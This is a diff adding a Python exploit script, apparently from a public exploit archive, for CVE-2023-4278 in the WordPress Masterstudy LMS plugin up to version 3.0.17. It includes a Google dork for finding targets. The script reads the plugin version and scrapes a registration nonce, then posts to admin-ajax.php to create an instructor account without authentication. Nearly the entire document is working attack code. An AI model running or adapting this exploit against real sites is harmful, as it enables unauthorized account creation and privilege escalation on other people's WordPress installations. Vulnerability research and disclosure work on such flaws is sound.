@@ -1,0 +1,107 @@
+id: 39102
+date: 10/09/2023
+title: Wordpress Masterstudy LMS Plugin - 3.0.17 - Unauthenticated Instructor Account Creation Exploit
+author: Revan Arifio
+cves: CVE-2023-4278
+
+# Exploit Title:  Wordpress Plugin Masterstudy LMS - 3.0.17 - Unauthenticated Instructor Account Creation
+# Google Dork: inurl:/user-public-account
+# Exploit Author: Revan Arifio
+# Vendor Homepage: https:/.org/plugins/masterstudy-lms-learning-management-system/
+# Version: <= 3.0.17
+# Tested on: Windows, Linux
+# CVE : CVE-2023-4278
+
+import requests
+import os
+import re
+import time
+
+banner = """
+   _______      ________    ___   ___ ___  ____        _  _ ___ ______ ___  
+  / ____\ \    / /  ____|  |__ \ / _ \__ \|___ \      | || |__ \____  / _ \ 
+ | |     \ \  / /| |__ ______ ) | | | | ) | __) |_____| || |_ ) |  / / (_) |
+ | |      \ \/ / |  __|______/ /| | | |/ / |__ <______|__   _/ /  / / > _ < 
+ | |____   \  /  | |____    / /_| |_| / /_ ___) |        | |/ /_ / / | (_) |
+  \_____|   \/   |______|  |____|\___/____|____/         |_|____/_/   \___/ 
+                                                                            
+======================================================================================================
+|| Title            : Masterstudy LMS <= 3.0.17 - Unauthenticated Instructor Account Creation       ||
+|| Author           : https://github.com/revan-ar                                                   ||
+|| Vendor Homepage  : https:/wordpress.org/plugins/masterstudy-lms-learning-management-system/      ||
+|| Support          : https://www.buymeacoffee.com/revan.ar                                         ||
+======================================================================================================
+
+"""
+
+
+print(banner)
+
+# get nonce
+def get_nonce(target):
+    open_target = requests.get("{}/user-public-account".format(target))
+    search_nonce = re.search('"stm_lms_register":"(.*?)"', open_target.text)
+    if search_nonce[1] != None:
+        return search_nonce[1]
+    else:
+        print("Failed when getting Nonce :p")
+
+
+
+# privielege escalation
+def privesc(target, nonce, username, password, email):
+
+    req_data = {
+        "user_login":"{}".format(username),
+        "user_email":"{}".format(email),
+        "user_password":"{}".format(password),
+        "user_password_re":"{}".format(password),
+        "become_instructor":True,
+        "privacy_policy":True,
+        "degree":"",
+        "expertize":"",
+        "auditory":"",
+        "additional":[],
+        "additional_instructors":[],
+        "profile_default_fields_for_register":[],
+        "redirect_page":"{}/user-account/".format(target)
+        }
+
+    start = requests.post("{}/wp-admin/admin-ajax.php?action=stm_lms_register&nonce={}".format(target, nonce), json = req_data)
+
+    if start.status_code == 200:
+        print("[+] Exploit Success !!")
+    else:
+        print("[+] Exploit Failed :p")
+
+
+
+# URL target
+target = input("[+] URL Target: ")
+print("[+] Starting Exploit")
+plugin_check = requests.get("{}/wp-content/plugins/masterstudy-lms-learning-management-system/readme.txt".format(target))
+plugin_version = re.search("Stable tag: (.+)", plugin_check.text)
+int_version = plugin_version[1].replace(".", "")
+time.sleep(1)
+
+if int(int_version) < 3018:
+    print("[+] Target is Vulnerable !!")
+    # Credential
+    email =  input("[+] Email: ")
+    username =  input("[+] Username: ")
+    password =  input("[+] Password: ")
+    time.sleep(1)
+    print("[+] Getting Nonce...")
+    get_nonce = get_nonce(target)
+    # Get Nonce
+    if get_nonce != None:
+        print("[+] Success Getting Nonce: {}".format(get_nonce))
+        time.sleep(1)
+        # Start PrivEsc
+        privesc(target, get_nonce, username, password, email)
+    # ----------------------------------
+    
+else:
+    print("[+] Target is NOT Vulnerable :p")
+
+#  0day.today [2023-10-12]  #
